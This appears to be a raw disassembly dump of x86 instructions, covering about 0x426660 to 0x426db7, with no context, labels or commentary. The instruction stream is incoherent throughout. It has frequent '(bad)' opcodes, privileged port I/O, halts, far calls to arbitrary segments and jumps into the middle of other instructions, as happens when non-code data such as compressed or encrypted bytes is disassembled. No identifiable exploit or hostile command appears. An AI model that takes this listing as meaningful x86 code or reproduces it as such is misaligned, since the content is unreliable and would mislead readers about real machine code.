  42660e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42660f:	sti    
  426610:	cmp    BYTE PTR [eax-0x36e48aa5],cl
  426616:	or     ecx,0xf27ac247
  42661c:	sub    BYTE PTR [edi-0x52],bh
  42661f:	add    esi,DWORD PTR [edx+ebx*8]
  426622:	addr16 xchg esi,eax
  426624:	rol    BYTE PTR [ecx+ecx*4],cl
  426627:	retf   0x2db9
  42662a:	mov    eax,ds:0xeb4252fb
  42662f:	push   esi
  426630:	shl    cl,cl
  426632:	inc    edi
  426633:	xchg   BYTE PTR [eax],al
  426635:	ds sti 
  426637:	cmc    
  426638:	fmul   QWORD PTR [ebx-0x596a68f2]
  42663e:	sbb    al,ah
  426640:	sbb    esi,esi
  426642:	cmp    al,dh
  426644:	mov    dh,0xd5
  426646:	mov    edx,0xaed8c3ed
  42664b:	sbb    edi,DWORD PTR [ebx]
  42664d:	add    bl,BYTE PTR [esi]
  42664f:	add    dl,BYTE PTR [esi+0x6a2093fb]
  426655:	sub    al,0x9
  426657:	loopne 0x426603
  426659:	push   cs
  42665a:	retf   
  42665b:	repnz add ch,BYTE PTR [edi+eiz*4-0x9]
  426660:	push   edi
  426661:	sar    dl,1
  426663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426664:	(bad)  
  426665:	int    0x1e
  426667:	stc    
  426668:	or     eax,0x48028019
  42666d:	call   0xdd3dc3e7
  426672:	je     0x426645
  426674:	sub    al,0xa1
  426676:	(bad)  
  426677:	and    ecx,DWORD PTR [ecx]
  426679:	fistp  QWORD PTR [edi]
  42667b:	cwde   
  42667c:	leave  
  42667d:	js     0x426691
  42667f:	stc    
  426680:	xor    BYTE PTR [ebx],bl
  426682:	xor    dl,ah
  426684:	xchg   ebx,eax
  426685:	adc    DWORD PTR [ecx-0x1c],ebx
  426688:	lahf   
  426689:	mov    ebx,0xa64cbdc3
  42668e:	push   ebx
  42668f:	call   0x6355:0x3c075da0
  426696:	cmp    ebx,DWORD PTR [edi+0x22]
  426699:	jae    0x4266e1
  42669b:	cdq    
  42669c:	cwde   
  42669d:	outs   dx,BYTE PTR ds:[esi]
  42669e:	int3   
  42669f:	fwait
  4266a0:	cmp    al,0x1d
  4266a2:	or     BYTE PTR [esi+0x1de5c548],cl
  4266a8:	fadd   QWORD PTR [edx+0x47]
  4266ab:	aam    0xe8
  4266ad:	or     BYTE PTR [ebp-0x66],bl
  4266b0:	mov    esi,0xcf6f1b00
  4266b5:	idiv   DWORD PTR [eax+0x73]
  4266b8:	adc    eax,0xf9fdaea8
  4266bd:	or     eax,0xf4f45f0f
  4266c2:	xor    al,0x32
  4266c4:	cs add eax,0x896ac753
  4266ca:	out    0x7e,eax
  4266cc:	mov    ds:0x3ceeb195,al
  4266d1:	in     eax,dx
  4266d2:	loopne 0x426694
  4266d4:	sbb    DWORD PTR [eax+0x1a],ebp
  4266d7:	xor    ecx,DWORD PTR es:[ecx+0x55]
  4266db:	dec    ebp
  4266dc:	jge    0x426707
  4266de:	in     al,0x94
  4266e0:	push   es
  4266e1:	push   cs
  4266e2:	imul   esi,DWORD PTR [edx+0x1dfae42f],0x5
  4266e9:	cmp    ecx,DWORD PTR [edi+edi*8-0x28]
  4266ed:	pop    edi
  4266ee:	dec    BYTE PTR [edx]
  4266f0:	test   DWORD PTR ds:0x8e2f8f5,eax
  4266f6:	add    DWORD PTR [ebx+0x437c27c9],0xad42872e
  426700:	retf   
  426701:	dec    ecx
  426702:	in     al,0x29
  426704:	jnp    0x42675d
  426706:	pop    edi
  426707:	not    BYTE PTR [ebp+0x1]
  42670a:	add    al,0x1f
  42670c:	popa   
  42670d:	test   al,0xb6
  42670f:	mov    DWORD PTR [ecx-0x41],ebp
  426712:	sub    dh,BYTE PTR [ebp+0x6b0ea724]
  426718:	imul   ebp,DWORD PTR [esp+ebp*8],0xcfdc624d
  42671f:	test   ch,bl
  426721:	sar    ecx,cl
  426723:	dec    edx
  426724:	js     0x42675d
  426726:	or     dl,BYTE PTR [ecx]
  426728:	int    0xd9
  42672a:	jns    0x426789
  42672c:	mov    ecx,0xbb4c971
  426731:	sub    eax,0xd13c43cf
  426736:	rcl    DWORD PTR [ebp-0x3f],0xe9
  42673a:	pop    edx
  42673b:	xchg   edx,eax
  42673c:	push   es
  42673d:	pop    ebp
  42673e:	loope  0x426761
  426740:	fistp  DWORD PTR [ecx-0x7f]
  426743:	inc    ebx
  426744:	inc    edi
  426745:	cmp    BYTE PTR [edx+0x71],dl
  426748:	repnz (bad) 
  42674a:	jns    0x4267b0
  42674c:	xor    al,0x7a
  42674e:	jmp    0x4266e4
  426750:	xor    ecx,esi
  426752:	mov    bx,WORD PTR es:[ecx-0x7]
  426757:	ja     0x426709
  426759:	lods   eax,DWORD PTR ds:[esi]
  42675a:	ret    0x4e6b
  42675d:	popf   
  42675e:	mov    ebp,0x32af8070
  426763:	jno    0x426738
  426765:	pxor   mm3,QWORD PTR [edx+eiz*4+0x2a]
  42676a:	mov    ch,0x88
  42676c:	mov    al,0x74
  42676e:	fldcw  WORD PTR [esi+eiz*4]
  426771:	mov    ah,0x75
  426773:	daa    
  426774:	inc    ecx
  426775:	push   ebx
  426776:	mov    esp,0xd6515c27
  42677b:	test   DWORD PTR [edi+0x3020983d],eax
  426781:	aas    
  426782:	mov    DWORD PTR [eax+ebp*4+0x47d16b77],ebp
  426789:	pop    edx
  42678a:	push   cs
  42678b:	add    DWORD PTR [eax+0xe7],eax
  426791:	add    BYTE PTR [ecx-0x126c16dc],al
  426797:	(bad)  
  426799:	ss cwde 
  42679b:	in     eax,0x27
  42679d:	inc    esp
  42679e:	sub    BYTE PTR [ebp+edi*4+0x1dff127],ch
  4267a5:	add    ah,dh
  4267a7:	add    al,0x0
  4267a9:	add    BYTE PTR [esi+0x528b22b3],ah
  4267af:	ror    ebx,0xda
  4267b2:	ret    0x6135
  4267b5:	and    BYTE PTR [edx+0x32],0x12
  4267b9:	daa    
  4267ba:	aam    0x7d
  4267bc:	sbb    bl,bh
  4267be:	push   0x1da3ee18
  4267c3:	sbb    bh,BYTE PTR [ebx+0x4168ffe9]
  4267c9:	sbb    BYTE PTR [eax-0x26cfbd6b],al
  4267cf:	adc    bh,BYTE PTR [esi]
  4267d1:	xor    al,0xb3
  4267d3:	cmp    bl,BYTE PTR ds:[ebx-0xb]
  4267d7:	fwait
  4267d8:	clc    
  4267d9:	mov    dh,0xe7
  4267db:	pop    esp
  4267dc:	das    
  4267dd:	inc    esi
  4267de:	or     DWORD PTR [eax],ebp
  4267e0:	pusha  
  4267e1:	jmp    0xd0b4638e
  4267e6:	mov    edi,0x375aa8fc
  4267eb:	sar    BYTE PTR [edx],1
  4267ed:	lods   eax,DWORD PTR ds:[esi]
  4267ee:	pusha  
  4267ef:	cmc    
  4267f0:	xor    BYTE PTR ds:0x8c334d,cl
  4267f6:	loop   0x426794
  4267f8:	and    BYTE PTR [edx+0x2e],dh
  4267fb:	clc    
  4267fc:	(bad)  
  4267fd:	retf   0x1fcc
  426800:	jecxz  0x42678b
  426802:	stos   DWORD PTR es:[edi],eax
  426803:	pop    ebp
  426804:	push   ebp
  426805:	(bad)  
  426806:	cs and BYTE PTR cs:[eax],cl
  42680a:	fdivr  DWORD PTR [ebp+0x4a]
  42680d:	stos   DWORD PTR es:[edi],eax
  42680e:	lea    esi,[eax-0x42579a6d]
  426814:	loop   0x4267a1
  426816:	sbb    esp,DWORD PTR [edx+esi*1+0x13405e3d]
  42681d:	dec    edi
  42681e:	mov    bl,0x41
  426820:	mov    edx,0x7428a283
  426825:	lahf   
  426826:	jbe    0x4267d6
  426828:	hlt    
  426829:	dec    ecx
  42682a:	pop    edx
  42682b:	clc    
  42682c:	stos   DWORD PTR es:[edi],eax
  42682d:	sub    dh,BYTE PTR [ebx-0x1eaf63ea]
  426833:	retf   
  426834:	push   ecx
  426835:	adc    dh,BYTE PTR [esi+edx*1+0x1f35c80e]
  42683c:	adc    DWORD PTR [ecx+ebp*4],esi
  42683f:	in     eax,dx
  426840:	ret    
  426841:	or     BYTE PTR [ebp+0x6f],al
  426844:	jne    0x426846
  426846:	call   0xa759c46d
  42684b:	push   edx
  42684c:	mov    WORD PTR ds:0xd6d3a8b6,?
  426852:	and    al,0x9b
  426854:	pop    edi
  426855:	ret    
  426856:	repnz scas eax,DWORD PTR es:[edi]
  426858:	repz mov ch,0x12
  42685b:	push   edx
  42685c:	aas    
  42685d:	mov    cl,BYTE PTR [ebp+0x59cbb7b8]
  426863:	popf   
  426864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426865:	push   ebp
  426866:	and    DWORD PTR [edi],esi
  426868:	dec    ebp
  426869:	push   ecx
  42686a:	iret   
  42686b:	std    
  42686c:	sub    edx,ebx
  42686e:	xchg   ebx,eax
  42686f:	xor    DWORD PTR [eax],edi
  426871:	dec    ecx
  426872:	mov    ds:0x4de5340b,al
  426877:	pop    DWORD PTR [edx]
  426879:	inc    ecx
  42687a:	or     ecx,DWORD PTR [esi]
  42687c:	and    al,0xe8
  42687e:	test   esp,esi
  426880:	push   0xa9f85e7a
  426885:	shl    DWORD PTR [esi-0x54],1
  426888:	je     0x4268b4
  42688a:	(bad)  
  42688b:	loope  0x42689f
  42688d:	cwde   
  42688e:	sti    
  42688f:	xchg   ecx,eax
  426890:	je     0x426873
  426892:	adc    BYTE PTR [eax],ah
  426894:	stos   BYTE PTR es:[edi],al
  426895:	mov    eax,0xbb9ab548
  42689a:	cmp    esp,ebx
  42689c:	or     al,0x94
  42689e:	clc    
  42689f:	retf   0x7078
  4268a2:	mov    ebp,0x7d1dba8e
  4268a7:	pop    es
  4268a8:	or     al,0x80
  4268aa:	ffree  st(5)
  4268ac:	lahf   
  4268ad:	mov    dh,0xfc
  4268af:	jmp    0x820b1d10
  4268b4:	push   ebp
  4268b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268b6:	jle    0x426924
  4268b8:	xor    eax,0x1e8b4fbb
  4268bd:	scas   eax,DWORD PTR es:[edi]
  4268be:	ins    BYTE PTR es:[edi],dx
  4268bf:	jnp    0x426885
  4268c1:	jecxz  0x42693c
  4268c3:	test   DWORD PTR [esi],esp
  4268c5:	sub    al,0xda
  4268c7:	(bad)  
  4268c8:	push   ss
  4268c9:	into   
  4268ca:	and    DWORD PTR [edx+eiz*8],ecx
  4268cd:	cmp    ah,BYTE PTR [ecx-0x41]
  4268d0:	call   0x47e2:0xfef9e6ea
  4268d7:	sub    dh,BYTE PTR [ebp+0x55e2ad0]
  4268dd:	rcr    bh,cl
  4268df:	push   ecx
  4268e0:	sbb    DWORD PTR [edx+0x5ebdd84b],esp
  4268e6:	xor    al,0x24
  4268e8:	xchg   esi,eax
  4268e9:	mov    ebp,0xa208fe50
  4268ee:	add    eax,0x82027ca7
  4268f3:	hlt    
  4268f4:	jle    0x4268d9
  4268f6:	adc    BYTE PTR [eax-0x44],bl
  4268f9:	je     0x426962
  4268fb:	pop    ss
  4268fc:	mov    cl,0xf8
  4268fe:	mov    WORD PTR [ecx+0x5f],ds
  426901:	sahf   
  426902:	jg     0x426897
  426904:	test   DWORD PTR [ebx-0x77],0xefa28c48
  42690b:	dec    edi
  42690c:	imul   BYTE PTR [edi]
  42690e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42690f:	pop    ds
  426910:	xchg   ecx,eax
  426911:	mov    dl,0xc3
  426913:	out    0x90,eax
  426915:	mov    DWORD PTR [ebx+0x3a],ebp
  426918:	xor    BYTE PTR [ebp-0x251e0817],0x1a
  42691f:	cwde   
  426920:	mov    eax,ds:0xfdcb19f3
  426925:	sub    al,BYTE PTR [esi+0x52]
  426928:	xchg   ecx,eax
  426929:	or     DWORD PTR es:0x88e21bd3,esp
  426930:	pop    esp
  426931:	mov    ds:0xfa22ffe0,al
  426936:	or     eax,0xb90e5322
  42693b:	popa   
  42693c:	dec    eax
  42693d:	jnp    0x4268e5
  42693f:	test   BYTE PTR [esi],0xd4
  426942:	sbb    al,BYTE PTR [ebp+0x7e946974]
  426948:	in     eax,0xd2
  42694a:	bound  ecx,QWORD PTR [ebp-0x69]
  42694d:	jnp    0x4268f9
  42694f:	jle    0x42696b
  426951:	sbb    eax,0x871861c8
  426956:	cli    
  426957:	fidiv  WORD PTR [ebx+0x30]
  42695a:	sub    ch,ah
  42695c:	pop    edi
  42695d:	stos   DWORD PTR es:[edi],eax
  42695e:	ds aam 0xdb
  426961:	mov    esi,0x78443c0f
  426966:	dec    ecx
  426967:	inc    ebp
  426968:	dec    esp
  426969:	cmp    cl,cl
  42696b:	cmp    eax,0xb7b012e3
  426970:	xchg   ebp,eax
  426971:	mov    cl,0x24
  426973:	leave  
  426974:	jbe    0x42694d
  426976:	test   ch,0xcf
  426979:	mov    DWORD PTR [edi-0x687a86f],edi
  42697f:	inc    esi
  426980:	jmp    0x7a23382d
  426985:	jmp    0x426987
  426987:	or     DWORD PTR [ebp+0x58],ecx
  42698a:	gs xchg edx,eax
  42698c:	and    ecx,DWORD PTR [esi-0x1750e727]
  426992:	fcom   QWORD PTR [ecx-0x6309c50e]
  426998:	dec    ebx
  426999:	call   0x3570:0x278ea697
  4269a0:	(bad)  
  4269a1:	in     eax,dx
  4269a2:	stos   BYTE PTR es:[edi],al
  4269a3:	jnp    0x426955
  4269a5:	inc    esp
  4269a6:	jmp    0x4269bb
  4269a8:	enter  0xb87c,0xc0
  4269ac:	mov    WORD PTR [ebx+0x27],es
  4269af:	lods   eax,DWORD PTR ds:[esi]
  4269b0:	mov    ds,WORD PTR [eax+0x9]
  4269b3:	mov    ecx,0x83cf0a76
  4269b8:	clc    
  4269b9:	adc    esi,esp
  4269bb:	aad    0x3e
  4269bd:	dec    ebx
  4269be:	or     bl,bl
  4269c0:	fistp  DWORD PTR [ecx+0x5f89f430]
  4269c6:	adc    ah,BYTE PTR [eax]
  4269c8:	aaa    
  4269c9:	cld    
  4269ca:	popf   
  4269cb:	pop    ebp
  4269cc:	(bad)  
  4269cd:	pop    eax
  4269ce:	adc    al,0xba
  4269d0:	jnp    0x4269ef
  4269d2:	in     eax,dx
  4269d3:	scas   eax,DWORD PTR es:[edi]
  4269d4:	inc    ebp
  4269d5:	cmc    
  4269d6:	adc    al,0xe7
  4269d8:	inc    edx
  4269d9:	adc    edi,DWORD PTR ds:0xf122e89b
  4269df:	mov    ds:0x5452097b,al
  4269e4:	sbb    ch,0xaf
  4269e7:	sbb    al,0x72
  4269e9:	jo     0x426992
  4269eb:	dec    esp
  4269ec:	lock pop ebx
  4269ee:	fsubr  st(1),st
  4269f0:	dec    ebx
  4269f1:	xchg   esi,eax
  4269f2:	imul   ecx,DWORD PTR [eiz*2-0x6dd607fe],0xffffff92
  4269fa:	adc    BYTE PTR [ebp+0x47],bh
  4269fd:	(bad)  [eax]
  4269ff:	or     dl,BYTE PTR [ebx-0x56282c49]
  426a05:	push   esp
  426a06:	cmp    ch,BYTE PTR [ebp+ecx*4+0x541a397a]
  426a0d:	(bad)  
  426a0e:	into   
  426a0f:	loop   0x426a88
  426a11:	outs   dx,BYTE PTR ds:[esi]
  426a12:	cmp    al,0x86
  426a14:	or     ebx,DWORD PTR [ebx+esi*8-0x3c]
  426a18:	dec    ecx
  426a19:	stos   DWORD PTR es:[edi],eax
  426a1a:	out    dx,eax
  426a1b:	fstp   TBYTE PTR ds:0x2d02ceef
  426a21:	popf   
  426a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a23:	cdq    
  426a24:	add    al,0x18
  426a26:	xchg   ebx,eax
  426a27:	sar    ebx,cl
  426a29:	xlat   BYTE PTR ds:[ebx]
  426a2a:	mov    eax,0xba888a57
  426a2f:	cli    
  426a30:	mov    esp,0x61025f90
  426a35:	popa   
  426a36:	jb     0x426a4a
  426a38:	out    dx,al
  426a39:	mov    bh,0x9d
  426a3b:	sahf   
  426a3c:	inc    edx
  426a3d:	cmp    BYTE PTR [ecx-0x11bdc5a],ch
  426a43:	out    0xc8,al
  426a45:	pop    ebx
  426a46:	or     BYTE PTR [edi+0x585217ee],ch
  426a4c:	xchg   ebp,eax
  426a4d:	xchg   edi,eax
  426a4e:	jb     0x426a1d
  426a50:	mov    dl,0xa1
  426a52:	push   edx
  426a53:	sub    DWORD PTR [ebp+0x22],ebp
  426a56:	(bad)  
  426a57:	shl    DWORD PTR [ebx+0x45],cl
  426a5a:	jmp    0xf666:0xa4d3d059
  426a61:	and    BYTE PTR [edx],bh
  426a63:	test   eax,0x603802b1
  426a68:	and    esp,DWORD PTR [edi+ebp*8-0x4]
  426a6c:	lods   eax,DWORD PTR ds:[esi]
  426a6d:	pop    eax
  426a6e:	push   0xffffffa2
  426a70:	loop   0x426a46
  426a72:	pop    ds
  426a73:	pop    ecx
  426a74:	xchg   edx,eax
  426a75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a76:	and    eax,0xfed0fe24
  426a7b:	mov    cs,esi
  426a7d:	jo     0x426a39
  426a7f:	mov    ah,0xb
  426a81:	xlat   BYTE PTR ds:[ebx]
  426a82:	add    BYTE PTR [edx+0x6e77316f],dh
  426a88:	dec    edx
  426a89:	adc    ebp,DWORD PTR [ebp-0x6d]
  426a8c:	inc    eax
  426a8d:	cmp    esi,DWORD PTR [esi]
  426a8f:	leave  
  426a90:	test   esi,esi
  426a92:	fsubr  st(2),st
  426a94:	test   al,0xd7
  426a96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a97:	mov    al,0x25
  426a99:	test   eax,0x6a5ba2b
  426a9e:	fs dec esi
  426aa0:	cs sbb eax,0xb2e78631
  426aa6:	xchg   ebp,eax
  426aa7:	adc    eax,DWORD PTR [esp+ebp*1+0x6c9bf03f]
  426aae:	into   
  426aaf:	lahf   
  426ab0:	xor    DWORD PTR [edi+ebp*1-0x7e1ff418],ebp
  426ab7:	in     al,0x18
  426ab9:	cmp    DWORD PTR [ebx],eax
  426abb:	mov    bl,0x92
  426abe:	aas    
  426abf:	push   0xd6f5d47f
  426ac4:	and    dl,ah
  426ac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ac7:	xlat   BYTE PTR ds:[ebx]
  426ac8:	iret   
  426ac9:	mov    dh,0xdf
  426acb:	rcr    DWORD PTR [ebx+0x374c2e79],0x3c
  426ad2:	dec    eax
  426ad3:	outs   dx,BYTE PTR ds:[esi]
  426ad4:	push   ecx
  426ad5:	and    esp,DWORD PTR [ebx-0x622f3274]
  426adb:	repz inc ecx
  426add:	(bad)  
  426ade:	xchg   edi,eax
  426adf:	push   edi
  426ae0:	cli    
  426ae1:	push   esp
  426ae2:	xor    eax,0xe3a1d16d
  426ae7:	xchg   ebp,eax
  426ae8:	lea    eax,[esi+0x442c2c17]
  426aee:	mov    ds:0x8148b057,al
  426af3:	out    dx,al
  426af4:	sar    dh,0x79
  426af7:	leave  
  426af8:	jne    0x426ab5
  426afa:	mov    ch,BYTE PTR [ecx+0x4]
  426afd:	jmp    0x2f304c43
  426b02:	in     al,dx
  426b03:	mov    esp,0x8d0e0efd
  426b08:	xlat   BYTE PTR ds:[ebx]
  426b09:	push   es
  426b0a:	push   esi
  426b0b:	arpl   WORD PTR [di-0x1f8e],dx
  426b10:	fadd   st(5),st
  426b12:	lods   eax,DWORD PTR ds:[esi]
  426b13:	imul   edi,DWORD PTR [ebx+0x60],0x79
  426b17:	daa    
  426b18:	mov    edi,0x3a96ff80
  426b1d:	outs   dx,BYTE PTR ds:[esi]
  426b1e:	imul   eax,esi,0x69
  426b21:	mov    DWORD PTR [edi],esp
  426b23:	sub    eax,0x3a397112
  426b28:	fisttp WORD PTR [ebx+0x20]
  426b2b:	xchg   ebp,eax
  426b2c:	cs imul ebp,edi,0x24fbda04
  426b33:	inc    ebp
  426b34:	xchg   edx,eax
  426b35:	push   cs
  426b36:	test   eax,0xa3483d67
  426b3b:	xor    dh,BYTE PTR [edi]
  426b3d:	out    dx,eax
  426b3e:	out    0xdd,al
  426b40:	fwait
  426b41:	popa   
  426b42:	(bad)  
  426b44:	sbb    al,0x1e
  426b46:	cmp    esp,DWORD PTR [esi+esi*2-0x7f]
  426b4a:	push   es
  426b4b:	pop    ebx
  426b4c:	ror    DWORD PTR [ecx+ecx*1+0x3e],cl
  426b50:	jno    0x426aeb
  426b52:	pop    eax
  426b53:	je     0x426b7b
  426b55:	jecxz  0x426b7d
  426b57:	xchg   BYTE PTR [ebx+0x72f9430f],ch
  426b5d:	shr    edi,cl
  426b5f:	mov    al,0x38
  426b61:	dec    edx
  426b62:	pop    esp
  426b63:	stos   BYTE PTR es:[edi],al
  426b64:	push   esp
  426b65:	xlat   BYTE PTR ds:[ebx]
  426b66:	out    0xd1,eax
  426b68:	stos   BYTE PTR es:[edi],al
  426b69:	pop    fs
  426b6b:	loope  0x426bb1
  426b6d:	jp     0x426b8f
  426b6f:	mov    esp,0x38cc0f89
  426b74:	rcr    eax,1
  426b76:	retf   
  426b77:	pushf  
  426b78:	push   eax
  426b79:	inc    edx
  426b7a:	jne    0x426be1
  426b7c:	shr    BYTE PTR [ecx+0x78817fd0],0xab
  426b83:	push   es
  426b84:	xor    eax,0x2aa7d555
  426b89:	jo     0x426b81
  426b8b:	clc    
  426b8c:	push   esi
  426b8d:	imul   edx,DWORD PTR [eax],0x50db6bda
  426b93:	rcl    DWORD PTR [ebx],0x4e
  426b96:	shr    DWORD PTR [ebx],0x11
  426b99:	fdivr  QWORD PTR [edi-0x787f1908]
  426b9f:	test   al,0x90
  426ba1:	pushf  
  426ba2:	ja     0x426b5e
  426ba4:	push   ds
  426ba5:	fsubr  DWORD PTR [edi+0x4f]
  426ba8:	pop    eax
  426ba9:	fucomp st(1)
  426bab:	mov    cl,0x26
  426bad:	das    
  426bae:	xchg   esp,eax
  426baf:	push   edx
  426bb0:	dec    esp
  426bb1:	arpl   WORD PTR [ebp+ebp*4-0x3d5b7868],bx
  426bb8:	imul   ebp,eax,0xeff020b8
  426bbe:	arpl   WORD PTR [esi-0x62],ax
  426bc1:	mov    bh,0x5e
  426bc3:	pop    edi
  426bc4:	ret    
  426bc5:	mov    eax,ds:0x5f5c9de0
  426bca:	leave  
  426bcb:	mov    ebx,0x60c43b61
  426bd0:	leave  
  426bd1:	stos   DWORD PTR es:[edi],eax
  426bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bd4:	hlt    
  426bd5:	dec    ebp
  426bd6:	mov    al,0xba
  426bd8:	rol    BYTE PTR [ebx+0x4e],cl
  426bdb:	jnp    0x426ba5
  426bdd:	jg     0x426b8c
  426bdf:	js     0x426c5a
  426be1:	xchg   DWORD PTR [eax-0x2d1c8cc0],esi
  426be7:	and    al,0x44
  426be9:	pop    DWORD PTR [ebp-0x29fa9960]
  426bef:	jne    0x426bcb
  426bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bf2:	test   al,0x2b
  426bf4:	out    0x4d,al
  426bf6:	ja     0x426b8c
  426bf8:	jno    0x426bed
  426bfa:	xor    ebp,DWORD PTR [ebx+esi*4+0x41645981]
  426c01:	add    bl,ch
  426c03:	pop    ebp
  426c04:	mov    bl,0x58
  426c06:	mov    bl,0x2a
  426c08:	cmc    
  426c09:	fcmove st,st(4)
  426c0b:	in     eax,dx
  426c0c:	jmp    ebp
  426c0e:	sub    ecx,edx
  426c10:	jge    0x426bb5
  426c12:	ficomp WORD PTR cs:[edx+0x503c2ef0]
  426c19:	mov    cl,al
  426c1b:	js     0x426bd7
  426c1d:	inc    esi
  426c1e:	imul   eax,edi,0x7f
  426c21:	fistp  QWORD PTR [edx+0x7cd19cbb]
  426c27:	scas   al,BYTE PTR es:[edi]
  426c28:	push   edx
  426c29:	or     DWORD PTR [bp+si],edi
  426c2c:	adc    dl,BYTE PTR [ebx]
  426c2e:	bsf    edx,DWORD PTR [edi+0x47ce910e]
  426c35:	sub    DWORD PTR [edi+0x15],0x5e
  426c39:	pop    edi
  426c3a:	pushf  
  426c3b:	jecxz  0x426bd8
  426c3d:	mov    eax,ds:0x2ed4b5bb
  426c42:	out    dx,eax
  426c43:	imul   ebp,edx,0x12e5a91
  426c49:	ror    BYTE PTR [edx-0x7dd7a8a3],0x9
  426c50:	and    eax,0x44
  426c53:	popa   
  426c54:	jle    0x426c48
  426c56:	push   ebx
  426c57:	mov    ch,0x6a
  426c59:	cmp    esp,DWORD PTR [esi-0x2b95802d]
  426c5f:	xchg   DWORD PTR [ebx],ecx
  426c61:	in     al,dx
  426c62:	adc    eax,ecx
  426c64:	loope  0x426c9d
  426c66:	js     0x426c05
  426c68:	arpl   WORD PTR ds:0x74dd2fe3,bp
  426c6e:	das    
  426c6f:	stos   BYTE PTR es:[edi],al
  426c70:	dec    edx
  426c71:	mov    esi,0x27528de2
  426c76:	shl    esi,1
  426c78:	add    al,0x8d
  426c7a:	cmp    al,0x96
  426c7c:	adc    ebp,edx
  426c7e:	aad    0x17
  426c80:	push   ecx
  426c81:	pusha  
  426c82:	loop   0x426cc1
  426c84:	fadd   DWORD PTR [ecx]
  426c86:	mov    esp,0xadb5ab83
  426c8b:	mov    eax,ds:0xc59f4c35
  426c90:	push   cs
  426c91:	call   0xf5e2:0xf49ea659
  426c98:	std    
  426c99:	jb     0x426c57
  426c9b:	lods   al,BYTE PTR ds:[esi]
  426c9c:	mov    al,0xfd
  426c9e:	add    BYTE PTR [eax],al
  426ca0:	add    BYTE PTR [eax],al
  426ca2:	xchg   esi,eax
  426ca3:	rcr    BYTE PTR [edi],0x45
  426ca6:	pop    edi
  426ca7:	(bad)  
  426ca9:	rol    DWORD PTR [ebx-0x7d1771f0],cl
  426caf:	sahf   
  426cb0:	dec    edi
  426cb1:	jmp    0x44519b
  426cb6:	hlt    
  426cb7:	add    al,0x0
  426cb9:	add    bl,cl
  426cbb:	aam    0x1e
  426cbd:	xchg   ecx,eax
  426cbe:	add    al,BYTE PTR [esi-0x7a]
  426cc1:	mov    bl,BYTE PTR [edx-0x6e5817f]
  426cc7:	leave  
  426cc8:	loop   0x426c54
  426cca:	or     eax,0x846f00f8
  426ccf:	fld    DWORD PTR [ecx+0x5]
  426cd2:	lods   eax,DWORD PTR ds:[esi]
  426cd3:	adc    al,0x84
  426cd5:	mov    bl,0xeb
  426cd7:	stc    
  426cd8:	jp     0x426cba
  426cda:	add    ah,al
  426cdc:	loop   0x426d06
  426cde:	into   
  426cdf:	jge    0x426d00
  426ce1:	xor    ebp,DWORD PTR [eax-0x5]
  426ce4:	push   ebx
  426ce5:	jno    0x426c6d
  426ce7:	adc    ch,BYTE PTR [ebx]
  426ce9:	jnp    0x426d26
  426ceb:	lahf   
  426cec:	jg     0x426cd1
  426cee:	adc    eax,0x8ca08496
  426cf3:	lock inc eax
  426cf5:	mov    ebp,0x443fc800
  426cfa:	pusha  
  426cfb:	sbb    DWORD PTR [edi-0x18f91a12],ebx
  426d01:	mov    dl,0x9e
  426d03:	sbb    eax,edi
  426d05:	pop    ss
  426d06:	test   eax,0x352c808a
  426d0b:	int3   
  426d0c:	sar    BYTE PTR [edi-0x7281f28a],1
  426d12:	inc    ebp
  426d13:	mov    cl,0x5d
  426d15:	jl     0x426d24
  426d17:	add    eax,0xc4e1829e
  426d1c:	pusha  
  426d1d:	mov    cl,0xfb
  426d1f:	sub    esp,0xa8154ba3
  426d25:	ret    0xa204
  426d28:	cmp    eax,0x61ea656e
  426d2d:	adc    eax,0xe8feb5cf
  426d32:	mov    esp,gs
  426d34:	push   es
  426d35:	lahf   
  426d36:	mov    DWORD PTR [esi-0x78],edx
  426d39:	call   FWORD PTR ds:0x635e09b0
  426d3f:	fist   WORD PTR [ebp-0x4f]
  426d42:	push   eax
  426d43:	sti    
  426d44:	dec    edx
  426d45:	pop    es
  426d46:	retf   
  426d47:	push   ecx
  426d48:	ret    
  426d49:	dec    esp
  426d4a:	out    dx,al
  426d4b:	aaa    
  426d4c:	sahf   
  426d4d:	mov    ecx,0xea241f34
  426d52:	adc    ah,BYTE PTR [esi-0x799c8c28]
  426d58:	xchg   edx,eax
  426d59:	jo     0x426dc4
  426d5b:	adc    DWORD PTR [edx+ebx*8-0x6c],ebp
  426d5f:	or     DWORD PTR ds:0x33d53760,0x27
  426d66:	or     DWORD PTR [edx+0x63],0x1e9e0e05
  426d6d:	fwait
  426d6e:	outs   dx,BYTE PTR ds:[esi]
  426d6f:	pop    ebp
  426d70:	dec    ch
  426d72:	lods   eax,DWORD PTR ds:[esi]
  426d73:	stos   BYTE PTR es:[edi],al
  426d74:	mov    ebp,0xcd05a9ca
  426d79:	ja     0x426dbd
  426d7b:	in     eax,dx
  426d7c:	dec    edi
  426d7d:	add    BYTE PTR [ebx],dl
  426d7f:	aad    0x52
  426d81:	jb     0x426db3
  426d83:	std    
  426d84:	fistp  WORD PTR [ebx-0x50]
  426d87:	icebp  
  426d88:	jbe    0x426d5c
  426d8a:	xchg   ebp,eax
  426d8b:	cmp    al,0xe0
  426d8d:	fst    QWORD PTR [ebx]
  426d8f:	icebp  
  426d90:	mov    eax,ds:0x7c60eb30
  426d95:	mov    bl,0x4a
  426d97:	(bad)  
  426d98:	out    0x5d,al
  426d9a:	mov    ebx,0x23273a9b
  426d9f:	jne    0x426dd9
  426da1:	jae    0x426d83
  426da3:	scas   al,BYTE PTR es:[edi]
  426da4:	dec    edx
  426da5:	pop    ebp
  426da6:	gs ss mov ebp,0x1c271ef4
  426dad:	pop    ds
  426dae:	dec    ecx
  426daf:	mov    al,0x9e
  426db1:	rcr    ah,0xb2
  426db4:	and    BYTE PTR [ecx+0x4b],dh
  426db7:	mov    ah,0x11
